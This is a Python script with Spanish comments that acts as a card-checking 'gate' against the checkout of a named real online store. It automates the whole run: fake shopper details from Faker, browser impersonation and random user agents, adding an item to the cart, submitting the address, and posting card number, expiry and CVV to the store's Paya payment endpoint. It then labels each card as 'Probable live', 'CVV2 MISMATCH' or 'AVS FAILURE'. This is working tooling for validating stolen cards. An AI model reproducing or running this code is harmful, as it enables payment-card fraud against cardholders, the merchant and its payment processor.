import random
from faker import Faker
from random import choice
from curl_cffi import requests
from fake_useragent import UserAgent
import re

def usuario() -> dict:
    number = random.randint(1111, 9999)
    return {
        'name': Faker().name(),
        'email': Faker().email().replace('@', f'{number}@'),
        'phone': f'512678{number}',
        'city': Faker().city(),
        'state': 'Oregon', # Usar un estado fijo para simplificar el ejemplo
        'zip': '97402',   # Usar un código postal fijo
        'street': f"{random.randint(100, 999)} B Airport Rd"
    }

def ccn_gate(card):
    try:
        cc_number, mes, ano_number, cvv = card.split('|')
        if len(ano_number) == 4:
            ano_number = ano_number[2:4]

        cliente = requests.Session(
            impersonate=choice(["chrome124", "safari17_0"])
        )
        agente_user = UserAgent().random
        user_data = usuario()

        #============[Paso 1: Obtener form_key y user_agent]============#
        headers = {"User-Agent": agente_user}
        result = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
        form_key = re.search(r'name="form_key" type="hidden" value="(\w+)"', result.text)
        if not form_key:
            return "Failed to get form_key"
        form_key = form_key.group(1)

        #============[Paso 2: Añadir producto al carrito]============#
        headers["Cookie"] = f"form_key={form_key};"
        data = {"product": "21873", "item": "21873", "form_key": form_key,
                "super_attribute[183]": "6440", "qty": "1"}
        cliente.post(url="https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/",
                     data=data, headers=headers)

        #============[Paso 3: Obtener form_id del carrito]============#
        result = cliente.get(url="https://glorybee.com/checkout/cart/", headers=headers)
        form_id = re.search(r'"entity_id":"(\d+)"', result.text)
        if not form_id:
            return "Failed to get form_id"
        form_id = form_id.group(1)

        #============[Paso 4: Enviar información de envío y facturación]============#
        address_info = {
            "shipping_address": {
                "countryId": "US", "regionId": "49", "regionCode": "OR", "region": "Oregon",
                "street": [user_data['street']], "telephone": user_data['phone'],
                "postcode": user_data['zip'], "city": user_data['city'],
                "firstname": user_data['name'].split(' ')[0],
                "lastname": user_data['name'].split(' ')[1]
            },
            "billing_address": {
                "countryId": "US", "regionId": "49", "regionCode": "OR", "region": "Oregon",
                "street": [user_data['street']], "telephone": user_data['phone'],
                "postcode": user_data['zip'], "city": user_data['city'],
                "firstname": user_data['name'].split(' ')[0],
                "lastname": user_data['name'].split(' ')[1]
            },
            "shipping_method_code": "GND",
            "shipping_carrier_code": "shqups"
        }
        cliente.post(url=f"https://glorybee.com/rest/default/V1/guest-carts/{form_id}/shipping-information",
                     json={"addressInformation": address_info}, headers=headers)

        #============[Paso 5: Seleccionar método de pago Paya]============#
        data_payment = "payment_method=paya"
        cliente.post(url="https://glorybee.com/magecomp_surcharge/checkout/applyPaymentMethod/",
                     data=data_payment, headers=headers)

        #============[Paso 6: Enviar datos de la tarjeta a Paya]============#
        paya_data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={user_data['name']}"
        result = cliente.post(url="https://glorybee.com/paya/checkout/request", data=paya_data, headers=headers)
        
        #============[Paso 7: Capturar el resultado]============#
        try:
            message_text = result.json().get('paymentresponse', {}).get('message', 'No message')
        except:
            return "No JSON response"

        if "AVS FAILURE" in result.text:
            return "AVS FAILURE"
        elif "There was a problem with the request." in message_text:
            return "Probable live"
        elif "CVV2 MISMATCH" in message_text:
            return "CVV2 MISMATCH"
        
        return message_text

    except Exception as e:
        print(f"Error en el gate: {e}")
        return "Gate Failed ❌"

